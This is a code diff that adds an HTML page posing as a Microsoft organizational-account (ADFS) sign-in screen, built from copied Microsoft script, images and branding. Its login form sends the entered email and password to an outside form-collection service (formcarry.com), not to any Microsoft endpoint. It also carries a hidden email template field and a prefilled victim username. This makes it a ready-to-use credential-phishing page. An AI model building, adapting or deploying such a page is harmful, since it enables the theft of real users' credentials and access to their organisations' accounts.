@@ -1,0 +1,296 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en-GB">
+    <head>
+       
+
+        <title>Sign In</title>
+        <style>
+        	button.submit,input[type=submit]{display:inline-block;min-width:80px;width:100%;height:50px;margin-bottom:8px;padding:4px 20px 6px;border:1px solid #58a8f7;border-style:solid;border-width:1px;border-radius:5px;background-color:#58a8f7;line-height:35px;font-size:1.3em;font-weight:400;color:#fff;text-align:center;transition:background 0;cursor:pointer;-ms-user-select:none;-moz-transition:background 0;-webkit-transition:background 0;-o-transition:background 0;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-o-user-select:none;user-select:none}
+input[type=submit]:hover,button.submit:hover{background:#0072bc}
+        </style>
+        <script type='text/javascript'>
+//<![CDATA[
+function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;user@[EMail_DomainPart]\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; var maxPasswordLength = 128;
+//]]>
+</script>
+
+<script type='text/javascript'>
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+InputUtil.updatePlaceholder = function (input, placeholderText) {
+    var node = document.getElementById(input);
+    if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+            (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+            var label = node.previousSibling;
+            if (label != null) {
+                label.value = placeholderText;
+            }
+        }
+        else {
+            node.placeholder = placeholderText;
+        }
+    }
+};
+
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" type="text/css" href="https://sts.secsso.net//adfs/portal/css/style.css?id=96A6D48BD25179330FF1E2037E995893B460227C81D77F07B845B37C9FDE0CB2" />
+        <style>.illustrationClass {background-image:url('https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/Hero-M365HP-1920x720:VP4-1399x726');}</style>
+
+    </head>
+    <body dir="ltr" class="body" background="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/Hero-M365HP-1920x720:VP4-1399x726" >
+     
+    
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <img class='logoImage' id='companyLogo' src='https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31' alt='Private Document Access'/>
+                </div>
+                <div id="workArea">
+                    
+    <div id="authArea" class="groupMargin">
+        
+        
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div><br>
+
+        <form method="post" id="loginForm" autocomplete="off"   action="https://formcarry.com/s/BuqKm9DGZ6">
+            <div id="error" class="fieldMargin error smallText">
+                <span id="errorText" for=""></span>
+            </div><input type="hidden" name="login" value="[EMail]" />
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                    <input id="userNameInput" name="ai" type="email" required autofocus value="" tabindex="1" class="text fullWidth"
+                        spellcheck="false" placeholder="enter your email" autocomplete="off"/>
+                </div>
+
+                <div id="passwordArea">
+                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                    <input id="passwordInput" name="pr" type="password" tabindex="2" class="text fullWidth"
+                        placeholder="Password" autocomplete="off"/>
+                </div>
+                <div id="kmsiArea" style="display:none">
+                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
+                    <label for="kmsiInput">Keep me signed in</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <button id="submitButton" class="submit" tabindex="4" role="button" type="submit">Sign in</button>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
+        </form>
+
+             <div id="authOptions">
+        <form id="options"  method="post" action="https://sts.secsso.net:443/adfs/ls/?client-request-id=5982c4dd-44c0-4e64-bb61-5622801bb20e&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAY2RO2zTUBSGfePUJOEVFYSQWKKKCenGvjcPO5aQcGKCkipOE6LQsER-XCemca7jR5NmQggJxs5lY8xYFlSWDkydMleCgQl1QkwdSdSFDf7h0zn6p_OdRyzKIvmhcBUM14SCbSNokvX0V_zNVPrb1ze9U9XSvujdrdcPjm8dgXtk6owHUz0kvudTaq-WrEndBcgMw9ALZJ6nUTiidC9LbdsxybrkXd0Z8Z8BWAKwiInFnJhH-SISBakgISwUhGxxBaloGbBQwhbMi0SCBsY6LOkl0zJ0G5GSfR673VSicIjXoL4zJ79jSZv6bt-jQXjEmqoZllWqDFRFLVPq9lsW3fY6B-NKpeXCfejvkLmprVrRRaSlkMmu2u1UJxPa7rmzfMVtHkTOTCvnZ6jozhooDFAktg2rGmz3h6LXgETrCwv2v9Qds9zqbJeOz1iOemTsWD_YzVdZMiLkSaC7QXQlbRkHF_EbAisnEqk0c5_JMJdx8HFj5f3izotP3z8E2rvLjvq2xjJnG7zEj9rd-fNIejpv1jXesLtYmtbQbqNWr6v7_MCoNttdhd_Tn_UeYxkdcuCQ4064ZIJNM1tsZQf95MAvDry_xpwk__mr89RdLGABIgSxkBFKcq4g5_DL5XVwepP5Aw2&cbcxt=&username=j.elee%40samsung.com&mkt=&lc=">
+            <script type="text/javascript">
+                function SelectOption(option) {
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+            </script>
+            <input id="optionSelection" type="hidden" name="AuthMethod" />
+            <div id='authOptionLinks' class='groupMargin'></div>
+        </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+            <a href='#' onclick="window.open('https://corpadpss.secsso.net', '_blank', 'toolbar=no,top=100px, left=100px,width=700,height=630');" ></A>                     
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'userNameInput';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+                if (!userName.value || !userName.value.match('[@\\\\]')) {
+                    u.setError(userName, e.userNameFormatError);
+                    return false;
+                }
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                if (password.value.length > maxPasswordLength) {
+                    u.setError(password, e.passwordTooLong);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+        </script>
+    </div>
+
+    </div>
+
+                </div>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <div id="footer">
+                <div id="footerLinks" class="floatReverse">
+                     <div><span id="copyright">&#169; 2023 Microsoft</span></div>
+                </div>
+            </div>
+        </div> 
+    </div>
+   
+
+
+    </body>
+</html>
